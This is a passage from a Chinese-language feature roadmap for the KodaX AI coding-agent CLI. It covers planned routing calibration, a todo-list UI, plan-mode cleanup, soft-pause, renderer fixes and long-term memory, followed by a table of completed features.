- `FEATURE_106` (v0.7.31) 是 v0.7.30 实战观察驱动的 **AMA Harness Selection Calibration**。**根因**：6 因子叠加—— (1) 路由启发式默认 `H0_DIRECT`（FEATURE_061 设计意图保留）/ (2) Scout tool policy `undefined` = write/edit/multi_edit/bash 全套放行 / (3) Scout role-prompt 称 `H0 (default)` + emit "optional"（v0.7.26 c4f4514 引入，需收紧）/ (4) **scope reflection 在 AMA 路径完全失效**（v0.7.26 FEATURE_084 把 AMA 从 `runDirectKodaX → runKodaX` 迁到 `Runner.run → genericRun`，后者不调 substrate `applyPostToolProcessing`，bug latent 自 v0.7.26）/ (5) **reflection 文本引用 stale tool name `emit_managed_protocol`**（v0.7.22 旧名，AMA 实际 emit 工具是 `emit_scout_verdict`）/ (6) v0.7.29 FEATURE_103 Scout reasoning `quick→balanced` 让 Scout 更自信。**三 slice 修复**：(1) Slice 1 — scope reflection 升级为 ToolGuardrail（与 v0.7.37 anti-escape 同源范式，挂 scoutSpec/generatorSpec.guardrails，afterTool 拦截，文案修正为 emit_scout_verdict 并对齐 protocol-emitters payload shape）；(2) Slice 2 — Scout role-prompt 重写（去掉 H0 (default) 措辞、量化 H0 边界 ≤1 file ≤30 lines、SCOPE COMMITMENT 从主观 self-check 升级为 hard rule "≥2 files OR 从零搭项目必须先 emit_scout_verdict"）；(3) Slice 3 — `harnessSelectionTiming` 注册为 FEATURE_101 第 8 项 Quality Invariant（observe-only severity=`warn`，记录而不阻断）。**Eval 流程不依赖线上反馈**：所有 prompt 改动 + reasoning 档位决策跨 FEATURE_104 alias 表 8 个 coding-plan provider/model（`zhipu/glm51` / `kimi` / `mimo/v25` / `mimo/v25pro` / `mmx/m27` / `ark/glm51` / `ds/v4pro` / `ds/v4flash`，跨 5 个独立 provider 家族）跑 `benchmark/harness/`，Stage 1（48 cases）验证 8 alias 上不退化，Stage 2（108 cases）跨 prompt × reasoning 矩阵验证 `multi_file_h0_rate` ≤5% 并给 FEATURE_103 reasoning 决断提供量化支撑。**Acceptance 量化阈值锁住**：multi_file_h0_rate ≤5% / pre_emit_commitment_rate ≥70% / harness_correctness 在 8 alias mean ≥80% std ≤8% / task_quality 不退化超 -2 noise band。**显式不做**：P0 hotfix 单独发 patch（取消，全部合 v0.7.31 修完整）；改 H0_DIRECT 路由启发式；改 Scout tool policy（H0 内仍需 write/edit）；动 admission scope（FEATURE_101 自管 7 项 closed set，106 注册第 8 项是外部消费者用法）；引入用户层新 mode（SA/AMA 稳定，ADR-003）。**依赖**：硬依赖 FEATURE_085 (ToolGuardrail runtime, v0.7.26) + FEATURE_101 (invariant runtime, v0.7.31 同版本) + FEATURE_104 (prompt eval harness, v0.7.29)；与 FEATURE_094 (v0.7.37 anti-escape) 同源范式协同。详见 [v0.7.31 FEATURE_106 设计](features/v0.7.31.md#feature_106-ama-harness-selection-calibration)。
- **整体时序锁定（Plan B + 092 + 100 + 106 + 109）**：v0.7.22 (079) → v0.7.23 (080+081) → v0.7.24 (082+083) → v0.7.25 (existing 075+076) → v0.7.26 (084+085) → v0.7.27 (086+091) → v0.7.28 (087+088) → **v0.7.29 (100 + 078 + 103 + 104, SA Runner Frame Adoption + Role-Aware Reasoning Profiles + Scout Calibration & L5 Followup Escalate + Prompt-Eval Harness Module)** → **v0.7.30 (existing 057+060)** → **v0.7.31 (101+089+106, Admission Contract + Agent Generation + AMA Harness Selection Calibration)** → v0.7.32 (090) → v0.7.33 (092) → ... → v0.7.45 (102) → v0.7.46 (105) → v0.7.47 (108) → **v0.7.48 (109, Harness Observability Substrate — Long-Term Memory + Prediction Contract + Cross-Family Prose Guard)**。依赖关系硬性：079→080+081→082+083→084+085→086 不可打乱；091 可与 082-086 并行（契约包不影响内部重构）；087 需 080+081 到位；088 需 087；089 需 087；090 需 089；**100 需 084+085 到位（hard）；078 / 089 / 090 / 092 / 094 / 106 都需 100 到位（hard）—— Agent declaration 上的 reasoning slot、Runner 级 guardrail 注册栈、`Runner.run(constructedAgent, ...)` 调用链、manifest hot-swap 的 Runner lifecycle 边界，全部依赖 SA 路径已进入 Runner 帧**；**092 / 106 需 085 到位**（106 Slice 1 的 ToolGuardrail 直接挂在 Scout/Generator agent declaration 上）；**106 需 101 到位**（Slice 3 的 `harnessSelectionTiming` invariant 注册到 101 的 invariant runtime）；**106 需 104 到位**（Eval Plan 跨 FEATURE_104 alias 表 8 个 coding-plan provider/model 强制走 `benchmark/harness/`）。0.8.0 之后不规划。
- `FEATURE_097` 是 v0.7.34 的独立 UX 增强：在 AMA spinner 下方新增 Claude Code 风格的实时计划列表（TodoListSurface 组件），用可视化的 pending / in_progress / completed / failed / skipped 状态展示 Scout 在入口阶段生成的 `executionObligations[]`。**决策点**：**不**按 H0/H1/H2 复杂度硬编码折叠显示；参照 Claude Code 做法，由 Scout 自主决定是否产出 obligations —— 1 条或 0 条时直接不渲染（简单任务自然不干扰），2+ 条统一展开。所有 obligations 完成后 5 秒延迟隐藏。数据流复刻 FEATURE_086 (`onRepoIntelligenceTrace`) 管线：**单路** `KodaXEvents.onTodoUpdate` 回调（不做 `KodaXManagedTaskStatusEvent.todoItems` 双轨兜底——单进程 CLI 不存在订阅遗漏的真实场景，FEATURE_086 单路至今未见问题是先例，按 KodaX 极简哲学砍掉）+ 新增 `TodoUpdate` 工具（Scout 在 H0_DIRECT 继续执行时 / Generator / Planner 都可主动推进状态）+ Evaluator verdict 自动收尾（revise → in_progress 项标 failed → 下轮 reset pending；不动 Evaluator 协议，§5 决策细节 ①）。**Schema 简化（2026-05-03）**：drop Claude Code 的 `content/activeForm` 双形式，只保留 `content` 单字段直接复用 Scout 既有 `executionObligations: string[]`，零 prompt eval 触发对协议的双形式产出要求。**H0 时机修复（GLM external review 2026-05-03 提出）**：原稿"Scout 不注入 todo_update"是 H0 时机 bug——H0 时 Scout = executor 继续干活，不注入会导致 H0 全程没 todo 推进；修复为 Scout 工具集注入 todo_update + role-prompt 限定"仅 emit_scout_verdict 之后、作为 H0_DIRECT executor 时调用"。**H0 Mini-Planner 强度 release gate（已完成 2026-05-04）**：64 cells pilot（4 case × 2 variant × 8 alias × 1 run）实测 Heavy 全面占优——multistep_completeness 双双触顶 100% → 回退次要信号；obligation_coherence 81%→95.5% (+14.5pp 跨 5 家族同向消除"Read X" filler 步骤)，simple_overformalization 8.3%→0% (Heavy 反而更不会让简单任务过度形式化)，harness_correct 91.3%→95.7% (+4.3pp)。**Ship Heavy** 写入 Scout role-prompt（≥2 distinct steps → 列 obligations + 正反例 + emit 时机 + todo_update 推进）；详见 `benchmark/results/feature-097--pilot-1run--ANALYSIS.md`。**LLM 行为兜底**：3 层兜底简化为 2 层（v0.7.30 设计稿初版列了 Layer 3 启发式 in_progress 推断，2026-05-03 砍掉——经查 Claude Code 也没做，他们只有 `TURNS_SINCE_WRITE=10` reminder；KodaX 同等设计 `TURNS_SINCE_TODO_UPDATE_REMINDER=8`）。**依赖**：FEATURE_084 (v0.7.26) 重写完成后的 Scout executionObligations 契约稳定形态；FEATURE_086 (v0.7.27) 前缀清理后的干净命名（避免在工具/类型重命名期间双轨维护）；**FEATURE_110 (v0.7.34 同版本前置)** 砍掉路径 1 老 plan-mode，否则 Phase 4+ "Plan Mode 联动" 延伸要双写两条路径。**不做**：fs 持久化 / 依赖图 / 跨进程 swarm 共享（Claude Code V2 级别的重型基础设施，KodaX 单进程不需要）/ session-scoped resume todo 列表（task-scoped 即可，§5 决策细节 ④）/ JSON / CLI 对外 surface（推迟到 v0.8.2 FEATURE_113）/ Evaluator 协议加 failed_obligation_ids 字段（不映射，§5 决策细节 ①）。
- `FEATURE_110` (v0.7.34) 是 plan-mode 实现层的去重：KodaX 当前同时存在两套 plan-mode 实现且会真实打架——路径 1（`/plan` slash 命令 + `runWithPlanMode` + readline/chalk + `plan-storage` 持久化，v0.3.1 时代）已被 FEATURE_074 v0.7.20 引入的路径 2（`PermissionMode="plan"` + `exit_plan_mode` tool + Ink-native PlanScrollPanel 审批 UI）完全替代但从未删除。**真实打架场景**：用户先 `/plan on`（路径 1 `planMode=true`）又把 `PermissionMode` 切到 `"plan"`（路径 2），wizard 内调 `runManagedTask` 没显式覆盖 `permissionMode` → 继承 `"plan"` → 写工具被 `planModeBlockCheck` 阻断 → wizard 自己的 `confirm("Execute this step?")` 已 y 通过却得到 `[Tool Error]`。**死代码铁证**：路径 2 持续投入（FEATURE_074/075/097 phase 4），路径 1 上次实质改动是 v0.6 时代小修，KNOWN_ISSUES 记录"plan-mode 路径不接 pendingInputs"两个版本未修，README first-class tool 表只有 `exit_plan_mode`，路径 1 `~/.kodax/plans/*.json` 持久化跟主线 lineage / permission gate 都没接。**改动表面**：删 `packages/repl/src/common/plan-mode.ts` (281 行) + `packages/repl/src/common/plan-storage.ts` (77 行)；清理 5 处引用——`src/index.ts:54-60` re-export（public API 泄漏，README 未 document，CHANGELOG 标 breaking note）/ `packages/repl/src/index.ts:81-90` re-export / `packages/repl/src/interactive/commands.ts:50,1549-1640` (整个 /plan 命令块) / `packages/repl/src/ui/InkREPL.tsx:136,1348,6097-6099,6197,6670-6672,6839,6850,7055` (`planMode` useState + 3 处 if 分支 + setPlanMode callback) / `packages/repl/src/interactive/repl.ts:69,1083,1167,1299` (readline-based REPL 仍是 active 入口，不能整文件砍只清 plan-mode 引用)。**不做**：自动迁移 `~/.kodax/plans/*.json`（CHANGELOG 一句话提示用户手动 `rm -rf` 即可，为死功能写迁移代码是反向投入）/ `/plan` slash 命令转生为路径 2 UX shortcut（用户已确认不留这个名字，YAGNI）/ 砍 `repl.ts` 整文件（仍是 active 入口）/ 改 FEATURE_074 路径 2 任何行为。**总计 ~ -460 ~ -500 行净删除，0 行新增**。**前置 FEATURE_097**：v0.7.34 内 FEATURE_110 先 land，FEATURE_097 后 land；这样 FEATURE_097 phase 4 的"Plan Mode 联动"延伸语义清晰单一仅指路径 2。
- `FEATURE_111` (v0.7.43, originally v0.7.35 → v0.7.37 → v0.7.38 → v0.7.43 — first shift because v0.7.35 became a hotfix-only release for FEATURE_092 / FEATURE_097 P0 issues; second shift on 2026-05-04 deferred FEATURE_094 from v0.7.36 to v0.7.37 and FEATURE_111 from v0.7.37 to v0.7.38, leaving v0.7.36 free; third shift on 2026-05-04 further deferred FEATURE_094 to v0.7.42 and FEATURE_111 to v0.7.43, leaving v0.7.36-v0.7.41 free) 是 runner-level **soft-pause protocol**：填补现有 `abort`（丢整个 turn 上下文，Planner 已花的 2000-6000 token 浪费）与 `pending-inputs`（`MAX_PENDING_INPUTS=5`，要等当前 LLM turn 自然结束才注入，长 tool 跑 90s+ 时延迟到爽）之间的 UX 缺口。**真实痛点**：用户在 H2 跑 `npm test` 90 秒中途想加一句"测试要包含 token rotation 场景"，当前两个选择都不好——abort 把 Planner token 全废，pending-inputs 要等 5+ 分钟才生效。**设计**：runner loop 加单 `paused: boolean` 局部变量（**不**引入 `PauseToken` 新类型 / **不**引入三状态机 `running\|paused\|aborting`，一个 boolean 够），在每次 tool call 完成后、下一轮 LLM 调用之前调 `maybeWaitResume()` helper 检查一次（**不**在 tool 执行**中**检查保持 tool 原子性，长 bash/test 让它跑完）；新增 `KodaXEvents.waitForUserResume?(): Promise<string>` 让 UI 喂回 resume signal。**UI**：单击 ESC = soft-pause（spinner 文字变 `Paused (waiting for tool to finish)` → tool 完成后变 `Paused — type to inject, Enter to resume`），输入任意内容+Enter = resume + 注入下一轮 user message（前置 `<user-interjected mid-task>` 标签 + system reminder 让 LLM 知道是"插话"不是"新任务"），空 Enter = resume 不注入（统一"任意 Enter 都算 resume"，砍掉"空 Enter vs 输入 Enter"双语义—— LLM 能理解空消息 / continue 隐式语义，工程层硬编码两种 Enter 是把不必要复杂度暴露给用户），paused 状态再按 ESC = 升级为 abort（既有 double-ESC 路径不变）。**Prompt eval 硬性触发**：本 feature 触及 system prompt + role prompt（`<user-interjected mid-task>` 标签解读），按 FEATURE_104 规则必须新增 `tests/soft-pause-interject.eval.ts` 在 8 alias mean ≥80% 通过率（与 FEATURE_106 同一阈值）。**业界对齐**：Claude Code `messageQueueManager` "迭代边界热注入" + `QueryEngine.interrupt()` AbortController 双轨；OpenCode Effect fiber `Effect.onInterrupt` tool 完成前不强行打断；**反例 Warp** `CancellationReason::FollowUpSubmitted` 每次 follow-up = abort + restart 极端版 KodaX 不采用。**与 FEATURE_097 / 110 关系**：与 097 正交（soft-pause 触发后 TodoListSurface 不变 / spinner 文字变更但 todo 列表保持原状 / resume 后正常推进）；与 110 正交（FEATURE_110 砍老 plan-mode 让 plan-mode 简化到只有路径 2 一条，soft-pause 不与 plan-mode 交互——`PermissionMode="plan"` 下用户照样 ESC soft-pause 注入意见调整正在生成的 plan，符合 FEATURE_074 live predicate closure 语义）。**不做**：在 tool 执行**中**检查 paused（破坏 tool 原子性）/ 替代 pending-inputs（两者并存正交不冲突）/ 改 child agent abort/pause 协议 / 持久化 paused 状态 / 给 paused 状态加超时（用户离开终端时不应被自动取消）。**总代码量 ~100 行**（runner-driven.ts ~80 + InkREPL.tsx ~20 + 1 个 eval file + 单测）。详见 [v0.7.43 设计稿](features/v0.7.43.md#feature_111-runner-level-soft-pause-protocol)。
- `FEATURE_112` (v0.7.34) 是 **Investigation-Scale-Aware Routing — Read-Scope Fix**：修复 Scout 路由对 read-only 重度调研任务的系统性失明。**用户痛点**：实战反馈 KodaX 在"为什么 X 这么设计 / 解释整条数据流 / 跨模块审查"类任务上 Scout 永远 H0 单飞，从来不升 H1（让 Evaluator audit）也从来不派 child（早期分流），即使读 8+ 文件 / 跑 15+ 工具调用。**三轮独立调研 + 对抗评审定位的四点根因**：(1) `deriveTopologyCeiling` 只看 mutationSurface + assuranceIntent 不看 complexity，read-only 复杂任务天花板被锁死 H0；(2) `fanoutReason` 对 `primaryTask=unknown` 硬写 "No high-value shard class detected"，对 LLM 是负面 dispatch 信号；(3) Scout role-prompt 的 SCOPE COMMITMENT 只覆盖 mutation scope，无对称的 investigation-scope 触发条件；(4) `topologyCeiling: H1_EXECUTE_EVAL` 在 decisionSummary 是裸值，Scout 不知道 H1 意味着 "Evaluator audit"。**4 Slice 修复（对称 FEATURE_106 prompt-only 路径）**：Slice 1 — `deriveTopologyCeiling` 加 complexity 维度（read-only + complex/systemic → H1 ceiling，仅放宽天花板，Scout 仍持升级权 FEATURE_061）；Slice 2 — `fanoutReason` 对 unknown 任务改中性文案 "Task scope is unclassified; dispatch_child_task remains available if investigation threads emerge"（不动 admissibility 不动白名单）；Slice 3 — SCOPE COMMITMENT 加 investigation-scope rule（≥5 文件 OR ≥8 搜索 → emit H1）+ multi-thread early-decision rule（前 1-2 轮 ≥2 独立线程 → 早派 child），与 FEATURE_106 mutation rule 完全对称；Slice 4 — decisionSummary 给 H1/H2 ceiling 加 conditional 语义说明（"Evaluator can audit your conclusion if you escalate to H1"），闭合 Slice 1 的死锁。**Eval（单步 quantitative，对称 ama-harness-selection）**：4 case × 2 variant × 3 alias = 12 cells；`benchmark/datasets/read-scope-routing/`（4 case：shallow-qa 回归保护 / deep-systemic / multithread / unknown-heavy）+ 13 hermetic dataset shape 测试 + Layer 1 deterministic 9 单测覆盖 deriveTopologyCeiling 全 (mutationSurface × complexity × assurance) 矩阵。**Pass 阈值**（post-pilot 提升）：feature_112 在 shallow-qa ≥ 95% H0 不退化；三个 deep class `read_scope_h1_rate` ≥ baseline + 30pp（alias mean）；FEATURE_106 mutation 数据集 multi_file_h0_rate 保持 0%。**显式不做**：runtime investigation guardrail（child-executor guardrail 转发耦合 + 触发时机错误 + compaction 摘要被 hint 稀释 + tool_result rewrite session 重放风险）/ 改 `resolveAmaFanoutClass` 白名单加 qa/unknown（qa 设计为轻量路径不该开 fan-out；unknown 杂合类无差别开会 false-positive 派 child）/ 改 `isAmaFanoutClassActive` ambiguous gate（review/bugfix 在 ambiguous family 下意外解锁 fan-out 风险）/ 给 unknown 一个 fanoutClass=evidence-scan（evidence-scan 文案 "bounded evidence gathering before diagnosis" 与 unknown clarify-first 指示矛盾）/ 改 FEATURE_106 mutation rule 措辞。**与 FEATURE_097 / 110 完全正交可并行 land**（仅动 reasoning.ts + role-prompt.ts decisionSummary 文本，不与 plan-mode / todo list 交互）。**总改动**：~21 LoC 代码 + ~80 LoC eval dataset + ~140 LoC 单测，零跨包、零新基础设施、零 child-executor 改动。详见 [v0.7.34 FEATURE_112 设计](features/v0.7.34.md#feature_112-investigation-scale-aware-routing--read-scope-fix)。
- `FEATURE_096` **Migrated from v0.7.39 → v0.7.30 (2026-04-28)**：Windows-SSH ConPTY 自动降级到 main-screen policy。原计划 `v0.7.39` 单独成版本，2026-04-28 提前迁入 `v0.7.30` 与 `FEATURE_057` 同版交付。**迁入理由**：(1) 改动唯一核心文件 `packages/repl/src/tui/runtime.ts` 与 057 Track A/B 完全重合，自然内聚；(2) 设计稿自陈是 057 fullscreen 主线的"降级逃生门"，与 v0.7.30.md 第 558 行允许的 "burn-in compatibility flag as escape hatch" 同一位面；(3) 057 让 fullscreen 成为 capable host 默认路径——单独留 096 在 v0.7.39 会让 Windows-SSH 用户在 057 落地后到 v0.7.39 之间长期断档（9 个 minor 版本）；(4) 体量小风险低：5 个文件（runtime.ts + 4 个 test 文件），全部是"加分支 + 加 host profile 字面量"而非"改既有逻辑"。**改动表面**：新增 `remote_conpty_host` host profile 联合分支 + 对应 `FullscreenPolicy` 字面量 + `KODAX_FULLSCREEN={1|0|未设}` 三态用户级逃生开关（围绕 fullscreen 决策命名；`=1` 在 detect 阶段让 `isRemoteConptyHost` 不分流 / `=0` 在 policy 阶段强制 main-screen 联动关 mouse + 保留 streaming/spinner；两个 override 各自在不同层处理互不干扰）；不改 `AlternateScreen` 组件、`InkREPL` 的 `useKeypress` 管线、`resolveTranscriptPointerAction` 路由、`AlternateScreen` 的 alt-screen enter/exit 序列拼装（仅由 mouseTracking flag 自然消化）。**显式不做**：X10 mouse 解析 / DECSET 1007 alternate-scroll / 客户端终端指纹识别 / 替代 057。原 `docs/features/v0.7.39.md` 已并入 `v0.7.30.md`，git history 保留全部修订。
- **FEATURE_057 Track F (v0.7.30 必交付，不 defer)**：cell-level diff renderer 升级——把 `tui/substrate/ink/log-update.js` (241 行) + `tui/core/internals/log-update.js` (310 行) 从 `createStandard` / `createIncremental` 字符串级 full-frame 重写改为 cell-level diff，对标 Claude Code `src/ink/log-update.ts`。**为什么必交付不 defer**：(1) 057 整体目标是 "renderer 完整切换到对标 Claude Code 一套"，组件层已 vendor 自 npm `ink`，但渲染机制层仍是 `log-update` 字符串级——这是 npm `ink + log-update` 的方式，不是 Claude Code 的方式；defer Track F = 057 ship 半成品。(2) FEATURE_096 Windows-SSH 用户在 main-screen 路径下，每次 spinner/streaming 重写都会触发"擦掉再写"，字符串级 renderer 在 main-screen 下会让旧 UI 帧进 scrollback history 留 ghost frames——FEATURE_096 直接受影响。(3) Track E (output ownership purify) 解决"何时 replay"，Track F 解决"重写本身只发差异不 replay 全帧"，两者配套；缺 Track F 单做 Track E 仍解决不了重写残影。**完成判据**：log-update 输出从 "eraseLines(prev) + 全帧字符串" 改为 "cell-by-cell diff + 绝对坐标光标"；典型 1 字符变化的输出字节数从 2-4 KB 降到 < 100 字节；spinner 动画 / streaming 文本流不在主屏 scrollback 留旧帧痕迹。**详见**：[v0.7.30 Track F 设计](features/v0.7.30.md#track-f-cell-level-diff-renderer-for-ssh-friendly-output-absorbs-feature_095)。
- `FEATURE_109` (v0.7.48) 是读 [arxiv:2604.25850](https://arxiv.org/abs/2604.25850) (Agentic Harness Engineering, AHE) 后给 KodaX 整体做产品级校准的最小必要补强。**论文核心实证**：同一个 GPT-5.4，opencode 47.2% → Codex CLI 71.9% → AHE 77.0%（30pp harness gap，比换 model 还大）；component ablation 显示 long-term memory 单独 +5.6pp（最大单贡献，Hard 任务上 memory-only 63.3% 超过 full AHE 53.3%）；**system prompt 单独 -2.3pp**（prose 不 transfer，structure transfer）；fix precision 33.7%（5×random）vs regression precision 11.8%（2×random，self-attribution 对 regression 基本盲）。**对 KodaX 整体的判断**：(1) KodaX 7 类首类组件里只有 long-term memory 系统性缺失（grep `long.?term.?memory|cross.?session.?memory|persistent.?memory` 全仓 0 命中），FEATURE_108 reflective patcher 想消费的"沉淀型经验"恰好就是这一层；(2) FEATURE_090 audit log 是 passive ledger，论文 Decision observability 的 falsifiable contract 概念可以零新字段实现（在 `llmSummary` 自然语言里写 prediction，下次 self-modify 时 LLM 自己回看是否兑现）；(3) KodaX 12 provider 是真实 cross-family pool，论文证 cross-family transfer +5-10pp 的硬约束是 **prose 不能按 provider 分叉**，需要一个机械单测守住。**三 slice**：Slice A1 long-term memory 是 `<cwd>/.kodax/agent-memory.md` 一个 markdown 文件 + 三个最小函数 + 复用 FEATURE_090 ask-user 通路（不抽象 Repository / Manager / vector store / retrieval）；Slice A2 prediction contract 仅改 self-modify diff summary prompt 让 LLM 在 `llmSummary` 自然语言里写 "Predicted impact"，下次同 agent self-modify 时 inject 上一条 audit entry 让 LLM 自己写 "Verification of previous prediction"（零新 typed 字段、零 falsifiability check 函数、零 history reader 抽象）；Slice B2 cross-family prose guard 是 1 个单测断言 4 个 prompt 文件家族（system-prompt / role-prompt / protocol-emitters / coding-preset DEFAULT_INSTRUCTIONS）的常量字符串不出现 12 provider 的名字。**经过两轮自我审视和两个对立子 agent 辩论（极简哲学捍卫者 + 产品长期价值评估者）**，从最初列的 14 条压缩到 3 条工程任务 + 1 个 sanity check + 2 条 CLAUDE.md 原则。**显式不做**：cross-step risk pattern registry（现有 13 个 middleware hardcode 已 work，抽 registry 是为零次发生场景设计）/ rollback CLI（git revert + 删 `.kodax/constructed/agents/<name>/<v>/` 已够）/ tool description outcome-driven 优化机制（正确路径是 §A1+§A2 落地后让 KodaX agent 用现有 trace + memory 自己提 description PR 候选 emergent 而非工程化）/ self-modify 扩到 tool description（governance scope 极大扩展，至少需要 3+ 真实需求驱动）/ declarative middleware（agent 写 middleware 代码超出当前 governance 边界）/ fix-regression metric panel（工程化 metric 在 single-user CLI 场景意义不明，用 LLM-as-judge prompt disclaimer + CLAUDE.md 原则 2 兜底）。**与 FEATURE_108 sequencing**：FEATURE_108 (v0.7.47) 先 ship 时无 memory 可读 = reflector 只读 trace；v0.7.48 ship 后 FEATURE_108 下一次迭代消费 `.kodax/agent-memory.md` 避免对已知 boundary case 重复提候选 patch（FEATURE_108 设计稿在本 feature 实施时同步更新一段说明此消费关系）。**总代码量 < 500 行，无新 package、无新依赖、无新抽象层**。**CLAUDE.md 同步更新**两条原则：(1) Provider 分支位置 — provider-specific 分支只能在 LLM-call boundary（max_tokens / reasoning_effort / wire-level），不能延伸到 prompt prose；(2) LLM 自我评估的不可逆操作边界 — review verdict / self-modify diff summary / judges middleware / advisor verification 不能直接驱动 git commit / push / 文件删除 / 部署等不可逆操作，必须经过 user approve 或正交 control case 兜底。详见 [v0.7.48 FEATURE_109 设计](features/v0.7.48.md#feature_109-harness-observability-substrate--long-term-memory--prediction-contract--cross-family-prose-guard)。
- `FEATURE_113` (v0.7.48 之后规划，**v0.8.2** placeholder) 是 FEATURE_097 的对外 surface 延伸：FEATURE_097 (v0.7.34) 在 KodaX 内部维护一份完整 TodoList in-memory store + `KodaXEvents.onTodoUpdate` 单路事件，但**该数据从未对外暴露**——`--json` mode 只输 final answer + transcript，没有独立 CLI 命令 query 当前 todo 状态，上游 agent / IDE 扩展 / CI wrapper 无法消费 KodaX 的进度信号。本 feature 把同一份数据接到 JSON / CLI 两个对外 surface：(1) `--json` 输出流加 `{"type":"todo_update","items":[...]}` event type，每次 onTodoUpdate 触发输出一行 JSON；(2) `kodax todos [--watch] [--session ID]` CLI 命令查询当前 todo 状态。**用户 2026-05-03 确认 v0.7.34 暂时不加对外 surface，但记入未来 feature**。**显式前置**：FEATURE_097 必须先 ship + 至少 1-2 个 minor 版本的真实使用数据验证 todo 数据形态稳定。**显式不做**：自动激活（FEATURE_097 落地不会自动启用 JSON / CLI surface，是显式选择项）/ 复刻 Claude Code V2 swarm IPC（单进程 CLI 不需要 fs.watch + lockfile）/ 在 v0.7.34 ship 前预留 placeholder API（YAGNI）。详见 [v0.8.2 FEATURE_113 设计](features/v0.8.2.md#feature_113-todolist-json--cli-surface)。
- `FEATURE_095` **Absorbed into FEATURE_057（v0.7.30）Track F**：原计划 v0.7.39 单独成版本的"ink substrate cell-level diff 渲染管线重写"。实地核对 057 现状发现 `packages/repl/src/tui/core/` 已经落了 `screen.ts`（transcript-row 级 `TranscriptScreenBuffer`，非 cell 级）/ `selection.ts` / `hit-test.ts` / `termio.ts`（alt-screen + mouse-tracking）/ `scroll.ts` / `renderer.ts` / `engine.js` 等模块；057 设计稿 §10 renderer-native selection（要求"screen-buffer coordinates + hit-testing against rendered DOM rectangles"）、§11 ScrollBox parity（要求"viewport culling tied to renderer's layout pass"）都依赖 cell-level buffer，而该 buffer 是 095 设计稿的核心产物。两者不是兄弟，而是同一个重构故事的上下层。**合并后的 057 Track F**：在 `packages/repl/src/tui/substrate/ink/` 下引入 `cell-screen.ts`（避免与 `tui/core/screen.ts` 的 `TranscriptScreenBuffer` 撞名）、`frame.ts`、`csi.ts`、`osc.ts`；把 `substrate/ink/log-update.js` 与 `core/internals/log-update.js` 从 `createStandard / createIncremental` 字符串级重写成 `LogUpdate.render(prevFrame, nextFrame)` 类，统一走 cell-level diff + 绝对坐标光标。**SSH 闪烁根因更新**：原设计稿假设根因是 full-redraw 模式本身；实地用 `KODAX_TEE_STDOUT` 诊断后确认**真实根因是 `engine.js` altScreen 分支内 `this.log.clear() + this.log(fullFrameOutput)` 两次独立 stdout.write 拆帧**——中间 1~2ms ConPTY 把"屏幕清空"中间态 flush 给客户端就闪。该点已通过合并为单次 `this.log.clearAndRender(fullFrameOutput)` 的 10 行补丁消除（log-update 内部 eraseLines + content 以单次原子 write 发出），不再需要等 Track F 才能恢复 SSH 可用性。Track F 的剩余动机（TextInput 光标漂移根治、每帧字节量降至差异级、为 057 §10/§11 提供 cell buffer 基础）仍然成立，但紧迫性从"阻断 SSH 使用"降级为"TUI 质量提升"。**详见**：[v0.7.30 Track F 设计](features/v0.7.30.md#track-f-cell-level-diff-renderer-for-ssh-friendly-output-absorbs-feature_095)。

---

## 已完成 Feature

| ID | Title | Released | Design |
|---|---|---|---|
| `001` | Plan Mode | `v0.3.1` | [v0.3.1](features/v0.3.1.md) |
| `002` | Ask Mode Hardening | `v0.3.1` | [v0.3.1](features/v0.3.1.md) |
| `003` | Interactive Project Mode | `v0.3.1` | [v0.3.1](features/v0.3.1.md) |
| `004` | Interactive UI Refresh | `v0.3.3` | [v0.3.3](features/v0.3.3.md) |
| `005` | Monorepo Refactor | `v0.4.0` | [v0.4.0](features/v0.4.0.md) |
| `006` | Skills System | `v0.5.10` | [v0.5.0](features/v0.5.0.md) |
| `008` | Permission Model Hardening | `v0.4.6` | [v0.5.0](features/v0.5.0.md) |
| `009` | AI Layer Separation | `v0.5.0` | [v0.5.0](features/v0.5.0.md) |
| `010` | Agent Core and Skills Split | `v0.5.5` | [v0.5.0](features/v0.5.0.md) |
| `011` | Smart Context Compaction | `v0.5.14` | [v0.5.0](features/v0.5.0.md) |
| `012` | TUI Autocomplete | `v0.5.13` | [v0.5.0](features/v0.5.0.md) |
| `013` | Command System 2.0 | `v0.6.0` | [v0.6.0](features/v0.6.0.md) |
| `014` | Project Mode Enhancement | `v0.5.20` | [v0.5.20](features/v0.5.20.md) |
| `015` | Project Mode 2.0 | `v0.6.0` | [v0.6.0](features/v0.6.0.md) |
| `016` | CLI-Based OAuth Providers | `v0.5.22` | [v0.5.22](features/v0.5.22.md) |
| `017` | Pending User Inputs Queue | `v0.6.0` | [v0.6.0](features/v0.6.0.md) |
| `018` | Task-Aware Repository Intelligence Substrate | `v0.7.10` | [v0.7.10](features/v0.7.10.md#feature_018-task-aware-repository-intelligence-substrate) |
| `019` | Session Tree, Checkpoints, and Rewindable Task Runs | `v0.7.2` | [v0.7.0](features/v0.7.0.md#feature_019-session-tree-checkpoints-and-rewindable-task-runs) |
| `020` | AGENTS.md Workspace Rules | `v0.5.34` | [v0.6.0](features/v0.6.0.md) |
| `021` | Provider-Aware Reasoning Budget | `v0.5.37` | [v0.6.0](features/v0.6.0.md) |
| `022` | Adaptive Task Engine and Native Multi-Agent Control Plane | `v0.7.4` | [v0.7.0](features/v0.7.0.md#feature_022-adaptive-task-engine-and-native-multi-agent-control-plane) |
| `023` | Dual-Mode Terminal UX | `v0.7.30` (unreleased) | [v0.7.30](features/v0.7.30.md#feature_023-dual-mode-terminal-ux) |
| `024` | Project Harness | `v0.6.10` | [v0.6.10](features/v0.6.10.md) |
| `025` | Adaptive Task Intelligence and Harness Router | `v0.7.4` | [v0.7.0](features/v0.7.0.md#feature_025-adaptive-task-intelligence-and-harness-router) |
| `027` | Adaptive Multi-Agent Mode Toggle and Team-Mode Sunset | `v0.7.10` | [v0.7.10](features/v0.7.10.md#feature_027-adaptive-multi-agent-mode-toggle-and-team-mode-sunset) |
| `028` | First-Class Retrieval, Context, and Evidence Tooling | `v0.7.10` | [v0.7.10](features/v0.7.10.md#feature_028-first-class-retrieval-context-and-evidence-tooling) |
| `029` | Provider Capability Transparency and Harness Policy | `v0.7.1` | [v0.7.0](features/v0.7.0.md#feature_029-provider-capability-transparency-and-harness-policy) |
| `031` | Multimodal Artifact Inputs | `v0.7.30` (unreleased) | [v0.7.30](features/v0.7.30.md#feature_031-multimodal-artifact-inputs) |
| `032` | JSON Output Mode | `v0.6.20` (unreleased) | [v0.6.20](features/v0.6.20.md) |
| `033` | REPL Parallel Toggle | `v0.6.15` | [v0.6.15](features/v0.6.15.md) |
